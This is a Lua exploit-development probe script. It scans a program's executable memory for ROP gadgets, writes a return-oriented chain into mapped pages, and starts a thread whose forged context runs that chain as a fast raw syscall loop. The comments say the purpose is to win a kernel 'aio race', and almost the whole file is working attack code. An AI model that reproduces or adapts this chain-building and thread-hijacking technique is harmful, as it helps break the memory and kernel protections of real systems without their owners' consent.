-- CRASH_CLASS: HIGH
-- PROBE 510a: run a real syscall loop inside a thr_create child, with no Lua
-- involvement, so the loader's per-syscall lock cannot serialize it.
--
-- 509a/509b: every Lua syscall costs ~21 us, and a second Lua thread that
-- issues syscalls kills the process within ~50 ms.  If the only way into the
-- kernel is that path, no kernel race can be won.  But 156d proved a child
-- thread executes arbitrary eboot code with registers and RSP taken from the
-- ucontext.  So the child can run a return-oriented loop:
--
--   pop rax; ret / 20 / syscall; ret / inc qword [rdi]; ret / pop rsp; ret
--   -> back to the top of the chain
--
-- rdi comes from ucontext+0x48 and points at a counter page, so the counter is
-- the number of getpid calls the child completed.  Rate = counter / sleep time.
-- If the counter moves at MHz instead of the Lua path's ~47 kHz, the child is a
-- concurrent raw syscall engine, which is what the aio race needs.

print("=== PROBE 510a: child ROP syscall loop ===")
local function to_num(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function make_syscall(num)
    local t = {}
    for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = num
    setmetatable(t, getmetatable(syscall.pipe))
    return t
end
local function get_hi_lo(val)
    if type(val) == "table" and val.h then return val.h, val.l end
    return 0, to_num(val)
end
local function q(v)
    local h, l = get_hi_lo(v)
    return string.format("0x%08X_%08X", h, l)
end
local function wd(addr, val) return pcall(function() memory.write_dword(addr, val) end) end
local function wq(addr, val) return pcall(function() memory.write_qword(addr, val) end) end
local function rd(addr)
    local ok, val = pcall(function() return memory.read_dword(addr) end)
    if ok then return to_num(val) end
    return nil
end
local function rb(addr)
    local ok, val = pcall(function() return memory.read_byte(addr) end)
    if ok then return to_num(val) end
    return nil
end
local function rq(addr)
    local ok, val = pcall(function() return memory.read_qword(addr) end)
    if ok then return val end
    return nil
end
local function rq_lo(addr)
    local v = rq(addr)
    if not v then return 0 end
    local h, l = get_hi_lo(v)
    return h * 4294967296 + l
end
local function zero(buf, n)
    for off = 0, n - 4, 4 do wd(buf + off, 0) end
end

local sc_getpid = make_syscall(20)
local sc_thr_create = make_syscall(430)
local sc_thr_kill = make_syscall(433)
local sc_nanosleep = make_syscall(240)
local sc_mmap = make_syscall(477)
local sc_info = make_syscall(593)

local C_MAGIC, C_FLAGS, C_TYPE = 0x108, 0x0D0, 0x110
local C_CS, C_RIP, C_RSP, C_SS = 0x0C0, 0x0E0, 0x0F8, 0x100
local C_RDI = 0x048

local info = memory.alloc(0x200)
zero(info, 0x200)
wd(info, 0x160)
pcall(function() sc_info(uint64(0), info) end)
local text_lo, text_hi = rd(info + 0x108), rd(info + 0x10C)
if not text_lo then print("module query empty; aborting"); print("=== DONE ==="); return end
local eboot = uint64(string.format("0x%X%08X", text_hi or 0, text_lo or 0))
print("[0] eboot text base=" .. q(eboot))

-- one pass, four patterns
local pats = {
    {name = "pop rax;ret",      b = {0x58, 0xC3}},
    {name = "syscall;ret",      b = {0x0F, 0x05, 0xC3}},
    {name = "inc [rdi];ret",    b = {0x48, 0xFF, 0x07, 0xC3}},
    {name = "pop rsp;ret",      b = {0x5C, 0xC3}},
}
local found = {}
local LIMIT = 0x100000
local off = 0
while off < LIMIT do
    local v = rd(eboot + off)
    if not v then break end
    local v2 = rd(eboot + off + 4)
    local b = {}
    b[0] = v % 0x100
    b[1] = math.floor(v / 0x100) % 0x100
    b[2] = math.floor(v / 0x10000) % 0x100
    b[3] = math.floor(v / 0x1000000) % 0x100
    if v2 then
        b[4] = v2 % 0x100
        b[5] = math.floor(v2 / 0x100) % 0x100
    end
    for i = 1, #pats do
        local p = pats[i]
        if not found[p.name] then
            for k = 0, 3 do
                local ok = true
                for j = 1, #p.b do
                    if b[k + j - 1] ~= p.b[j] then ok = false break end
                end
                if ok then found[p.name] = eboot + off + k break end
            end
        end
    end
    if found["pop rax;ret"] and found["syscall;ret"] and found["inc [rdi];ret"] and found["pop rsp;ret"] then
        break
    end
    off = off + 4
end
print(string.format("[1] scanned 0x%X bytes", off))
for i = 1, #pats do
    local g = found[pats[i].name]
    print("    " .. pats[i].name .. " = " .. (g and q(g) or "NOT FOUND"))
end
local pop_rax = found["pop rax;ret"]
local sys_ret = found["syscall;ret"]
local inc_rdi = found["inc [rdi];ret"]
local pop_rsp = found["pop rsp;ret"]
if not (pop_rax and sys_ret and inc_rdi and pop_rsp) then
    print("missing gadget; aborting before creating a thread")
    print("=== DONE ===")
    return
end

local ps = 0x4000
local ok1, chain = pcall(function() return sc_mmap(uint64(0), uint64(ps), uint64(3), uint64(0x1002), uint64(0xFFFFFFFF), uint64(0)) end)
local ok2, counter = pcall(function() return sc_mmap(uint64(0), uint64(ps), uint64(3), uint64(0x1002), uint64(0xFFFFFFFF), uint64(0)) end)
local ch, cl = get_hi_lo(chain)
local kh, kl = get_hi_lo(counter)
if not ok1 or not ok2 or (ch == 0 and cl == 0) or (kh == 0 and kl == 0) then
    print("mmap failed; aborting"); print("=== DONE ==="); return
end
zero(counter, 0x100)
zero(chain, 0x200)
print("[2] chain=" .. q(chain) .. " counter=" .. q(counter))

local C0 = chain + 0x40
wq(C0 + 0x00, pop_rax)
wq(C0 + 0x08, uint64(20))
wq(C0 + 0x10, sys_ret)
wq(C0 + 0x18, inc_rdi)
wq(C0 + 0x20, pop_rsp)
wq(C0 + 0x28, C0)
print("[3] chain[0..5] = " .. q(rq(C0)) .. " " .. q(rq(C0 + 8)) .. " " .. q(rq(C0 + 0x10)) ..
    " " .. q(rq(C0 + 0x18)) .. " " .. q(rq(C0 + 0x20)) .. " " .. q(rq(C0 + 0x28)))

local tid_buf = memory.alloc(8)
zero(tid_buf, 8)
local ctx = memory.alloc(0x500)
zero(ctx, 0x500)
wq(ctx + C_MAGIC, uint64(0x480))
wd(ctx + C_FLAGS, 0)
wq(ctx + C_TYPE, uint64(0x10000))
wq(ctx + C_CS, uint64(0x43))
wq(ctx + C_SS, uint64(0x3B))
wq(ctx + C_RIP, pop_rax)
wq(ctx + C_RSP, C0 + 0x08)
wq(ctx + C_RDI, counter)

print("[4] calling thr_create (RIP=" .. q(pop_rax) .. " RSP=" .. q(C0 + 8) .. " rdi=" .. q(counter) .. ")")
local ok_tc, rv_tc = pcall(function() return sc_thr_create(uint64(ctx), uint64(tid_buf), uint64(0)) end)
local child = rq(tid_buf)
print("[4] thr_create: ok=" .. tostring(ok_tc) .. " rv=" .. tostring(to_num(rv_tc)) .. " tid=" .. q(child))

local ts = memory.alloc(16)
local function sleep_ms(ms)
    wq(ts, uint64(math.floor(ms / 1000)))
    wq(ts + 8, uint64((ms % 1000) * 1000000))
    pcall(function() sc_nanosleep(uint64(ts), uint64(0)) end)
end

for k = 1, 5 do
    local before = rq_lo(counter)
    sleep_ms(100)
    local after = rq_lo(counter)
    print(string.format("[5] t=100ms tick %d: counter %d -> %d (delta %d, ~%.0f calls/s)",
        k, before, after, after - before, (after - before) * 10))
end
local ok_k, rv_k = pcall(function() return sc_thr_kill(child, uint64(0)) end)
print("[6] thr_kill(child,0) rv=" .. tostring(to_num(rv_k)))
local ok_c, pid_c = pcall(function() return sc_getpid():tonumber() end)
print("[6] canary ok=" .. tostring(ok_c) .. " pid=" .. tostring(pid_c))
print("=== DONE ===")
